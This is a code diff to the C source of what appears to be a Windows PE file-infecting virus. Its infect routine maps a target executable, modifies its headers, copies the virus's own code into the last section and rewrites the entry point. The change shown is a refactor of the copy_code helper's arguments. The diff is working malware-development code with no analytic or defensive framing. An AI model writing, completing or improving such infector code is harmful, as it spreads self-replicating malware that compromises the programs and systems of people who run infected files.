@@ -20,7 +20,7 @@ typedef struct {
 
 static int can_infect(const char *filename);
 static void modify_headers(IMAGE_NT_HEADERS *nt_headers);
-static void *copy_code(IMAGE_NT_HEADERS *nt_headers, file_view_t *file_view);
+static void *copy_code(IMAGE_NT_HEADERS *nt_headers, void * target_start_address);
 static void modify_entrypoint(IMAGE_NT_HEADERS *nt_headers,
                               uint32_t entry_offset, void *target_code_begin);
 static uint32_t get_extended_file_size(const char *filename);
@@ -38,7 +38,7 @@ int infect(const char *filename, void *entry_function_addr) {
             IMAGE_NT_HEADERS *nt_headers =
                 get_nt_header_by_base(file_view.start_address);
             modify_headers(nt_headers);
-            void *target_code_begin = copy_code(nt_headers, &file_view);
+            void *target_code_begin = copy_code(nt_headers, file_view.start_address);
             uint32_t entry_offset =
                 (uint32_t)BYTE_DIFF(entry_function_addr, code_begin);
 
@@ -83,10 +83,10 @@ static void modify_headers(IMAGE_NT_HEADERS *nt_headers) {
         sizeof(IMAGE_SECTION_HEADER), nt_headers->OptionalHeader.FileAlignment);
 }
 
-static void *copy_code(IMAGE_NT_HEADERS *nt_headers, file_view_t *file_view) {
+static void *copy_code(IMAGE_NT_HEADERS *nt_headers, void * target_start_address) {
     IMAGE_SECTION_HEADER *section_header = get_last_section_header(nt_headers);
     void *target_code_begin =
-        BYTE_OFFSET(file_view->start_address, section_header->PointerToRawData);
+        BYTE_OFFSET(target_start_address, section_header->PointerToRawData);
     memcp(BYTE_OFFSET(code_begin, get_delta_offset()), target_code_begin,
           CODE_SIZE);
     return target_code_begin;
